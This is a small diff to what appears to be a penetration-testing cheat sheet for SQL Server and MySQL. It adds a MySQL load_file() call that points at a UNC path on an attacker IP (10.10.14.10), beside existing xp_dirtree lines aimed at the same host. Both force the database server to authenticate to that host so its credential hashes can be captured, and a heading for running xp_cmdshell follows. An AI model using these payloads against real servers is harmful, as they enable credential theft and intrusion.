@@ -22,6 +22,11 @@ xp_dirtree '\\10.10.14.10\any\thing';
 use master; exec xp_dirtree '\\10.10.14.10\any\thing';
 ```
 
+```mysql
+# Or
+load_file('\\10.10.14.10\any\thing');
+```
+
 #### Run xp_cmdshell
 
 ```mysql
